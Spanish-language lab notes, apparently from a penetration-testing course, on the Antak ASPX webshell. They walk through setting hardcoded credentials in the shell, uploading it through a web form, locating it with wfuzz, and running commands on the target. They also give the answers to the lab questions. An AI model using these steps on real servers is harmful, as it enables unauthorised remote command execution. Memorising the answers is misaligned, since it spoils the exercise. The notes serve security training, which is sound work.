*ACTIVE SERVER PAGE EXTENDED* (ASPX) es un tipo de archivos con extensión escritos para los FRAMEWORKS de MICROSFOTS ASP.NET.

Sobre este tipo de servidores podemos utilizar webshells del tipo ASPX.


# ANTAK Webshell
- Funciona como una consola de PowerShell dentro de un navegador.    
- Puede:
    - Ejecutar comandos como nuevos procesos.
    - Ejecutar scripts en memoria        
    - Codificar comandos.
    - Subir y descargar archivos.    
Los archivos se ubican en:
```
/usr/share/nishang/Antak-WebShell
antak.aspx Readme.md
```

## ¿Cómo utilizar ANTAK?
Copiamos la webshell en un directorio local, con el comando:
```
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

- Modificamos la línea 14 para establecer usuario y contraseña.    

Para agilizar el proceso, subiremos esta webshell a la misma web que los apuntes anteriores "WEBSHELLS LAUDANUM".
Pues, como la máquina es Windows esta seguirá funcionando aquí. 
Subimos la webshell al servidor, la ejecutamos accediendo a "http://status.inlanefreight.local/files"

Esta, nos abre una interfaz que nos pide el usuario y contraseña establecidos anteriormente.
Y ya tenemos la interfaz interactiva sobre la que podemos trabajar e inyectar comandos.

![[Pasted image 20250905113526.png]]

---
**QUESTIONS**
**TARGET: 10.129.42.197**
**vHosts needed for these questions: - status.inlanefreight.local**

**1. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)
Respuesta:** */usr/share/nishang/Antak-WebShell/antak.aspx*

**2. Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: ****\****, 1 space)*** 

En primer lugar, en la máquina atacante añadimos el VHOST que aloja la máquina víctima, con:
```
echo "10.129.42.197 status.inlanefreight.local" | sudo tee -a "/etc/hosts"
```
Este comando lo que hace es añadir a /etc/hosts el texto "10.129.42.197 status.inlanefreight.local".
Esta página, al final de todo, nos permite subir un archivo. Aqui es donde subiremos la webshell. Pide que el formato sea únicamente .zip o tar.gz files.

Nos copiamos el archivo:
```
/usr/share/nishang/Antak-WebShell/antak.aspx
```
En nuestro directorio, y establecemos un usuario y contraseña por defecto, modificando la línea 14 del archivo antak.aspx:
```
if (Username.Text == "pol" && Password.Text == "pol")
```

Subimos dicha Shell al servidor con la opción de "Upload File", y vamos a realizar fuzzing para descubir donde se aloja dicho archivo.
Ejecutamos:
```
wfuzz --hl=29 -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://status.inlanefreight.local/FUZZ
```
Y nos devuelve que existe el subdirectorio
```
http://status.inlanefreight.local/files
```

Pues, desde el navegador ejecutamos: 
```
http://status.inlanefreight.local/antak.aspx
```

Y ingresamos con usuario y contraseña pol:pol a la interfaz, y ejecutando un simple "whoami" obtengo la respuesta del ejercicio: *iis apppool\status*.

